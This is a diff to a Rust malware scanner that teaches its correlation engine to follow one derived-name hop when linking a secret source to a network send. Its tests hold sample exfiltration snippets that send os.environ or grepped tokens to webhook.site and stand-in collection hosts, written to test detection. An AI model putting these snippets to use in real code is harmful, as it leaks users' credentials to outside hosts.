@@ -1,0 +1,470 @@
+diff --git a/cli/src/corpus/engine.rs b/cli/src/corpus/engine.rs
+index 79f4c1c..12e47b2 100644
+--- a/cli/src/corpus/engine.rs
++++ b/cli/src/corpus/engine.rs
+@@ -4319,14 +4319,16 @@ mod reconcile {
+     /// artifact-lab-3-package (every version in the Datadog set,
+     /// artifact_lab_leak.py or setup.py) sends the environment in two hops:
+     /// the copy is bound to `data`, encoded into `encoded_data`, and the
+-    /// request passes that as `data=encoded_data`. Correlation links one hop,
+-    /// so this is not a chain; it linked only while a keyword argument's name
+-    /// counted as a use (the same code with the copy called `env` never
+-    /// linked). The samples keep NET-007 and INSTALL-001 at Critical; an
+-    /// ordinary host in place of the tunnel URL drops the file to LOW RISK.
+-    /// This is the measured cost of reading names as values.
+-    #[test]
+-    fn exfil_chain_does_not_follow_a_two_hop_flow() {
++    /// request passes that as `data=encoded_data`. The word reading linked
++    /// the keyword `data=` to the variable `data`: the right answer by a
++    /// coincidence of names. Reading names as values alone lost it (on the
++    /// main line, `exfil_chain_does_not_follow_a_two_hop_flow` pins that
++    /// loss). On this side branch (ws/exfil-hop) a name assigned from the
++    /// bound one (`encoded_data`) is followed where the word reading linked,
++    /// which keeps it; the same flow under a name the send does not repeat
++    /// (`env`) is not linked, as it never was.
++    #[test]
++    fn exfil_chain_follows_a_two_hop_flow_the_word_reading_linked() {
+         let leak = "import os\n\
+             import urllib.request\n\
+             import urllib.parse\n\
+@@ -4339,7 +4341,10 @@ mod reconcile {
+             \x20   urllib.request.urlopen(req)\n";
+         assert!(fires("leak.py", leak, "CRED-ENV-001"));
+         assert!(fires("leak.py", leak, "NET-007"));
+-        assert_eq!(chained("leak.py", leak, "EXFIL-CHAIN-001"), None);
++        assert_eq!(
++            chained("leak.py", leak, "EXFIL-CHAIN-001"),
++            Some(Severity::Critical)
++        );
+         // One hop is the chain: the copy itself as the payload.
+         let one_hop = leak.replace(
+             "data=encoded_data",
+@@ -4349,6 +4354,83 @@ mod reconcile {
+             chained("leak.py", &one_hop, "EXFIL-CHAIN-001"),
+             Some(Severity::Critical)
+         );
++        let sweep = "import os\n\
++            import urllib.request\n\
++            import urllib.parse\n\
++            \n\
++            def notmalfunc():\n\
++            \x20   data = dict(os.environ)\n\
++            \x20   print(data)\n\
++            \x20   encoded_data = urllib.parse.urlencode(data).encode()\n\
++            \x20   url = 'https://webhook.site/00000000-0000-0000-0000-000000000000'\n\
++            \x20   req = urllib.request.Request(url, data=encoded_data)\n\
++            \x20   urllib.request.urlopen(req)\n";
++        assert!(fires("setup.py", sweep, "CRED-ENV-001"));
++        assert!(severities("setup.py", sweep, "NET-007").contains(&Severity::Critical));
++        assert_eq!(
++            chained("setup.py", sweep, "EXFIL-CHAIN-001"),
++            Some(Severity::Critical)
++        );
++        // With an ordinary host, the chain is what makes it Critical.
++        let plain = "import os\n\
++            import requests\n\
++            from urllib.parse import urlencode\n\
++            \n\
++            data = dict(os.environ)\n\
++            encoded = urlencode(data)\n\
++            requests.post(\"https://collect.example.net/c\", data=encoded)\n";
++        assert_eq!(
++            chained("setup.py", plain, "EXFIL-CHAIN-001"),
++            Some(Severity::Critical)
++        );
++        // The siblings: the keyword or key of the send repeats the source's
++        // name, and a name built from it is what is sent.
++        for (source, hop, send) in [
++            (
++                "json = os.environ.copy()",
++                "payload = {k: v for k, v in json.items()}",
++                "requests.post(u, json=payload)",
++            ),
++            (
++                "params = os.environ[\"SERVICE_TOKEN\"]",
++                "q = {\"t\": params}",
++                "requests.get(u, params=q)",
++            ),
++            (
++                "data = dict(os.environ)",
++                "body = json.dumps(data).encode()",
++                "urllib.request.urlopen(urllib.request.Request(u, data=body))",
++            ),
++        ] {
++            let src = format!(
++                "import os, json, requests, urllib.request\nu = COLLECT\n{source}\n{hop}\n{send}\n"
++            );
++            assert_eq!(
++                chained("setup.py", &src, "EXFIL-CHAIN-001"),
++                Some(Severity::Critical),
++                "{send}"
++            );
++        }
++        let js = "const body = process.env.SERVICE_TOKEN;\n\
++            const payload = JSON.stringify({ v: body });\n\
++            fetch(\"https://collect.example.net/c\", { method: \"POST\", body: payload });\n";
++        assert_eq!(
++            chained("app.js", js, "EXFIL-CHAIN-001"),
++            Some(Severity::Critical)
++        );
++        let agent = "import subprocess, requests\n\
++            data = subprocess.check_output(\"env | grep -E 'TOKEN|SECRET'\", shell=True, text=True)\n\
++            encoded = data.encode()\n\
++            requests.post(\"https://metrics.example.dev/collect\", data=encoded)\n";
++        assert_eq!(
++            chained("audit.py", agent, "AGENTSC-CHAIN-001"),
++            Some(Severity::Critical)
++        );
++        // No link the word reading did not make.
++        let env = plain
++            .replace("data = dict", "env = dict")
++            .replace("urlencode(data)", "urlencode(env)");
++        assert_eq!(chained("setup.py", &env, "EXFIL-CHAIN-001"), None);
+     }
+ 
+     /// Shapes the value reading lost when the port was verified (hand-written
+diff --git a/cli/src/scanner/correlate.rs b/cli/src/scanner/correlate.rs
+index ab18063..7aa24fd 100644
+--- a/cli/src/scanner/correlate.rs
++++ b/cli/src/scanner/correlate.rs
+@@ -55,23 +55,27 @@
+ //! - **The bound value, not a parameter.** In the body of a function declared
+ //!   after the source with a parameter of the same name (`def ping(url):`),
+ //!   the name is that parameter ([`shadowed_from`]), unless the function is
+-//!   called with the bound value itself.
++//!   called with the bound value, or, within the rule's window, with a name
++//!   assigned from it (`t = token`, then `send(t)`; see [`called_with`]).
++//! - **One more hop, where the word reading linked.** A name assigned from
++//!   the bound one between the source and the send (`encoded =
++//!   urlencode(data)`) is followed when the word reading's window names the
++//!   bound name in its code (`Request(url, data=encoded)` beside a bound
++//!   `data`), so the value reading makes no link the word reading did not
++//!   ([`derived_names`]).
+ //! - **A same-line link is code.** A source and sink on one line (or one
+ //!   call) link unless one of them matched only the line's comment
+ //!   ([`apply_matching`]).
+ //!
+-//! The link is one hop: the bound name itself. The cost is a flow that only
+-//! linked by a coincidence of names: a copy of the whole environment bound to
+-//! `data`, then `encoded = urlencode(data)`, then `Request(url,
+-//! data=encoded)` sends the environment in two hops, and the link through
+-//! the keyword `data=` was never a reading of that flow (the same code with
+-//! the copy called `env` did not link either). Following that second hop
+-//! (`encoded` bound because its expression uses `data`) was measured and not
+-//! adopted: it links a client, a connection or a signature built from a key
+-//! as if it were the key (docs/detection/correlation-names.md). For the same
+-//! reason a function called with a name assigned from the bound value
+-//! (`t = token`, then `send(t)`) is not known to receive it, and its
+-//! parameter of the same name shadows the bound one.
++//! The hop is narrow on purpose. Following every name derived from the bound
++//! one (the propagation step measured and not adopted in
++//! docs/detection/correlation-names.md) links a client, a connection or a
++//! signature built from a key as if it were the key. This form follows a
++//! derived name only where the old word reading already linked the sink, so
++//! it restores the flows that linked through a coincidence of names (a copy
++//! of the environment bound to `data`, encoded, and sent as `data=encoded`)
++//! and adds no link the word reading did not make. It is measured against
++//! the propagation step in the same document ("The narrow one-hop follow").
+ //!
+ //! A rule may also set `sink_window_before`, which makes the window the
+ //! sink's *statement* (see [`statement_scope`]). That is for sinks matched on
+@@ -173,11 +177,13 @@ pub fn assigned_identifier(line: &str) -> Option<&str> {
+     assignment(line).map(|a| a.name)
+ }
+ 
+-/// An assignment a line makes: `recv.name = ...`.
++/// An assignment a line makes: `recv.name = rhs`.
+ struct Assignment<'a> {
+     /// The object the name is an attribute of (`self`, `cfg.inner`), if any.
+     recv: Option<&'a str>,
+     name: &'a str,
++    /// What follows the operator, to the end of the line.
++    rhs: &'a str,
+ }
+ 
+ fn assignment(line: &str) -> Option<Assignment<'_>> {
+@@ -185,6 +191,7 @@ fn assignment(line: &str) -> Option<Assignment<'_>> {
+     Some(Assignment {
+         recv: c.name("recv").map(|m| m.as_str()),
+         name: c.name("name")?.as_str(),
++        rhs: &line[c.name("op")?.end()..],
+     })
+ }
+ 
+@@ -1446,12 +1453,13 @@ pub fn apply_matching(
+             }
+             // What the value reading reads, as written and as code: the
+             // statement mode's window, or else the sink's call (see
+-            // [`call_scope`]). Made when a source first needs it.
+-            let value_cell: OnceCell<(String, String)> = OnceCell::new();
++            // [`call_scope`]), with the last line it reads. Made when a
++            // source first needs it.
++            let value_cell: OnceCell<(String, String, usize)> = OnceCell::new();
+             let value_text = || {
+                 value_cell.get_or_init(|| {
+-                    let raw = if statement_mode {
+-                        window.to_string()
++                    let (raw, last) = if statement_mode {
++                        (window.to_string(), scope.end)
+                     } else {
+                         // A piece of a line is the sink's command if the
+                         // sink's rule matches it (or has no pattern to ask).
+@@ -1459,9 +1467,13 @@ pub fn apply_matching(
+                         call_scope(&code, sink_line, names_a_destination(&sink.rule), &sink_in)
+                     };
+                     let masked = code_only(&raw, code.lang);
+-                    (raw, masked)
++                    (raw, masked, last)
+                 })
+             };
++            // The word reading's window as code, for following a derived
++            // name (see [`derived_names`]).
++            let window_cell: OnceCell<String> = OnceCell::new();
++            let window_code = || window_cell.get_or_init(|| code_only(window, code.lang));
+             let launched_cell: OnceCell<Vec<&str>> = OnceCell::new();
+             let launched = || launched_cell.get_or_init(|| launched_operands(launch_line));
+             for source in &sources {
+@@ -1518,7 +1530,7 @@ pub fn apply_matching(
+                         let bound = source_bindings(l);
+                         if by_value {
+                             let assigned = assignment(l);
+-                            let (raw, masked) = value_text();
++                            let (raw, masked, last) = value_text();
+                             // Where a parameter of the same name, of a
+                             // function the sink is in, takes over from the
+                             // bound value (see [`shadowed_from`]; the window
+@@ -1557,10 +1569,29 @@ pub fn apply_matching(
+                                     contains_word(raw, name)
+                                 }
+                             };
+-                            // Only the bound name itself: a name computed
+-                            // from it on another line is not followed (see
+-                            // the module documentation).
+                             bound.iter().any(|b| reads(b))
++                                // Outside the statement mode, a name assigned
++                                // from the bound one before the send, where
++                                // the word reading's window names the bound
++                                // one in its code (and not as the parameter
++                                // of a function the sink is in).
++                                || (!statement_mode
++                                    && bound.iter().any(|b| {
++                                        let w = window_code();
++                                        is_identifier(b)
++                                            && contains_word(prefix(w, limit(b, w.len())), b)
++                                    })
++                                    && derived_names(&code, source_line, *last, &bound)
++                                        .iter()
++                                        .any(|d| {
++                                            uses_value_before(
++                                                masked,
++                                                d,
++                                                code.lang,
++                                                None,
++                                                limit(d, masked.len()),
++                                            )
++                                        }))
+                         } else {
+                             bound.iter().any(|b| contains_word(window, b))
+                         }
+@@ -1686,16 +1717,17 @@ fn names_a_destination(rule_id: &str) -> bool {
+ /// delimiter (see [`heredoc_body_end`]; `sink_in` says whether a piece of the
+ /// line is still the sink's command). A complete statement after the sink is
+ /// something else: a docstring, a log line, the next function's `def
+-/// connect(url):`.
++/// connect(url):`. Also returns the last line read (the send's last line,
++/// before which [`derived_names`] looks for a hop).
+ fn call_scope(
+     code: &CodeLines,
+     sink_line: usize,
+     follow_uses: bool,
+     sink_in: &dyn Fn(&str) -> bool,
+-) -> String {
++) -> (String, usize) {
+     let lines = code.lines;
+     if sink_line == 0 || sink_line > lines.len() {
+-        return String::new();
++        return (String::new(), sink_line);
+     }
+     let depth = |n: usize| -> isize {
+         code.code(n)
+@@ -1728,10 +1760,74 @@ fn call_scope(
+         let python = code.lang == Lang::Python;
+         keep.extend((end + 1..=last).filter(|&n| uses_word(lines[n - 1], bound, python)));
+     }
+-    keep.into_iter()
++    let last_kept = keep.last().copied().unwrap_or(sink_line);
++    let text = keep
++        .into_iter()
+         .map(|n| lines[n - 1])
+         .collect::<Vec<_>>()
+-        .join("\n")
++        .join("\n");
++    (text, last_kept)
++}
++
++/// `s` up to byte `n`, or up to the char boundary before it.
++fn prefix(s: &str, n: usize) -> &str {
++    let mut n = n.min(s.len());
++    while !s.is_char_boundary(n) {
++        n -= 1;
++    }
++    &s[..n]
++}
++
++/// A line longer than this is not read as a hop by [`derived_names`]: a hop
++/// is one assignment, and a longer line is minified code, where one line
++/// holds a whole program.
++const MAX_HOP_LINE: usize = 1_000;
++
++/// Names assigned, on the lines after `source_line` and before `send_line`
++/// (the last line of the sink's [`call_scope`], or the line of a call
++/// [`called_with`] looks at), from an expression that uses a `bound` name —
++/// or a name derived before it — as a value: `encoded = urlencode(data)`
++/// after `data = dict(os.environ)`, `b64env = b64encode(benv)` after `benv =
++/// env.encode()`. A count of it (`n = len(secrets)`) is not one.
++///
++/// The value reading follows these only where the word reading's window
++/// names a bound name in its code (see [`apply_matching`]): an exfiltration
++/// that encodes the secret into a new name before a send whose window also
++/// names the secret (`Request(url, data=encoded_data)` beside a bound `data`)
++/// keeps the link the word reading made, and no link is made that the word
++/// reading did not make. Following derived names everywhere would be the
++/// taint propagation ADR-0005 keeps out of the engine, and would link
++/// ordinary clients (`auth = (user, password)`, then `get(url, auth=auth)`)
++/// that neither reading links.
++fn derived_names<'a>(
++    code: &CodeLines<'a>,
++    source_line: usize,
++    send_line: usize,
++    bound: &[&str],
++) -> Vec<&'a str> {
++    let lines = code.lines;
++    let mut names: Vec<&str> = bound.iter().copied().filter(|b| is_identifier(b)).collect();
++    let mut derived: Vec<&'a str> = Vec::new();
++    for n in source_line + 1..send_line.min(lines.len() + 1) {
++        let line: &'a str = lines[n - 1];
++        if line.len() > MAX_HOP_LINE {
++            continue;
++        }
++        let Some(a) = assignment(line) else {
++            continue;
++        };
++        if names.contains(&a.name) {
++            continue;
++        }
++        // `code_only` keeps offsets, so the right-hand side starts at the
++        // same offset in the line as code.
++        let rhs = code.code(n).get(line.len() - a.rhs.len()..).unwrap_or("");
++        if names.iter().any(|x| uses_value(rhs, x, code.lang, None)) {
++            names.push(a.name);
++            derived.push(a.name);
++        }
++    }
++    derived
+ }
+ 
+ /// `s.connect(("203.0.113.9", 4444))`, `self.sock.connect(...)`, `await
+@@ -2115,9 +2211,10 @@ const MAX_FAR_CALLS: usize = 8;
+ /// `send.call(null, token)`. (A keyword argument that only names the
+ /// function, `send=...`, is neither.)
+ ///
+-/// A call with a name assigned from the bound one (`t = token`, then
+-/// `send(t)`) is not followed: that would be the propagation step the module
+-/// documentation says is left out.
++/// Within the rule's window, a call with a name assigned from the bound one
++/// since the source line (`t = token`, then `send(t)`; see
++/// [`derived_names`]) passes the value on too. Further down it is not
++/// followed.
+ fn called_with(
+     code: &CodeLines,
+     name: &str,
+@@ -2145,6 +2242,17 @@ fn called_with(
+             continue;
+         }
+         let c = code.code(n);
++        // Called, within the window, with a name assigned from the bound
++        // value.
++        if n <= near
++            && c.len() <= MAX_HOP_LINE
++            && uses_word(c, name, python)
++            && derived_names(code, source_line, n, &[bound])
++                .iter()
++                .any(|d| uses_value(c, d, code.lang, None))
++        {
++            return true;
++        }
+         if !contains_word(c, bound) {
+             continue;
+         }
+@@ -2222,8 +2330,9 @@ fn names_the_outer_value(
+ /// (`def ping(url):` above `requests.get(url + "/ping")`); the start of
+ /// such a header on the sink line itself (`lambda url: requests.get(url)`);
+ /// `None` when no such header shadows it. A function that is called with
+-/// the bound value itself (`send(token)`; see [`called_with`] for where the
+-/// call may be) passes it on, and does not shadow it.
++/// the bound value (`send(token)`, or within the rule's window `send(t)`
++/// after `t = token`; see [`called_with`] for where the call may be) passes
++/// it on, and does not shadow it.
+ fn shadowed_from(
+     code: &CodeLines,
+     source_line: usize,
+@@ -3971,6 +4080,10 @@ mod tests {
+         // the function: these link.
+         let called = "token = read_secret()\n\ndef send(token):\n    requests.post(COLLECT, data=token)\n\nsend(token)\n";
+         assert!(value_links("app.py", called, 1, 4));
++        // Called with the secret under a name assigned from it (the one-hop
++        // follow of this side branch, within the rule's window).
++        let forwarded = "token = read_secret()\nt = token\n\ndef send(token):\n    requests.post(COLLECT, data=token)\n\nsend(t)\n";
++        assert!(value_links("app.py", forwarded, 1, 5));
+         // Called with something else, the parameter is something else.
+         let other = "token = read_secret()\n\ndef send(token):\n    requests.post(COLLECT, data=token)\n\nsend(\"public\")\n";
+         assert!(!value_links("app.py", other, 1, 4));
+@@ -4202,13 +4315,26 @@ mod tests {
+         assert!(links_in("app.js", &value_rule(), "token", prettier));
+     }
+ 
+-    /// A name assigned from the bound one is not followed (the propagation
+-    /// step docs/detection/correlation-names.md measured and left out), and
+-    /// a count of the secret is a number: neither links.
++    /// A name assigned from the bound one before the send is followed where
++    /// the word reading linked the sink, so the exfiltration that encodes the
++    /// secret under a new name keeps the link the keyword's name gave it; a
++    /// count of the secret is a number. (On the main line, where no derived
++    /// name is followed, this test is `a_derived_name_or_a_count_does_not_link`
++    /// and holds the negative half only.)
+     #[test]
+-    fn a_derived_name_or_a_count_does_not_link() {
++    fn a_derived_name_links_where_the_word_reading_did() {
++        for src in [
++            "data = read_secret()\nencoded = urlencode(data)\nrequests.post(COLLECT, data=encoded)\n",
++            "json = read_secret()\npayload = {k: v for k, v in json.items()}\nrequests.post(COLLECT, json=payload)\n",
++            "params = read_secret()\nq = {\"t\": params}\nrequests.get(COLLECT, params=q)\n",
++            "files = read_secret()\nblob = {\"f\": files}\nrequests.post(COLLECT, files=blob)\n",
++        ] {
++            assert!(value_links("s.py", src, 1, 3), "{src}");
++        }
++        let js = "const body = readSecret();\nconst payload = JSON.stringify({ v: body });\nfetch(COLLECT, { method: \"POST\", body: payload });\n";
++        assert!(value_links("a.js", js, 1, 3));
+         // The same flow under a name the send does not repeat was never
+-        // linked, and is not now.
++        // linked, and is not now: no link the word reading did not make.
+         let env =
+             "env = read_secret()\nencoded = urlencode(env)\nrequests.post(COLLECT, data=encoded)\n";
+         assert!(!value_links("s.py", env, 1, 3));
+diff --git a/cli/src/scanner/mod.rs b/cli/src/scanner/mod.rs
+index 52dcd1e..0b5ec60 100644
+--- a/cli/src/scanner/mod.rs
++++ b/cli/src/scanner/mod.rs
+@@ -50,7 +50,11 @@ pub use crate::corpus::schema::Evidence;
+ /// 8: a helper handed the bound value by reference receives it; a connection
+ /// opened by a method call is followed to the send on its object; a heredoc
+ /// after `&&`, `||` or `;` is read only if that command is the sink.
+-pub const ENGINE_REVISION: u32 = 8;
++/// 9: (ws/exfil-hop, a side branch for evaluation) a name assigned from the
++/// bound one is followed one hop where the word reading's window names the
++/// bound one, and a helper called with such a name within the rule's window
++/// receives the value.
++pub const ENGINE_REVISION: u32 = 9;
+ 
+ /// The scan phases, each targeting a different threat category.
+ #[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
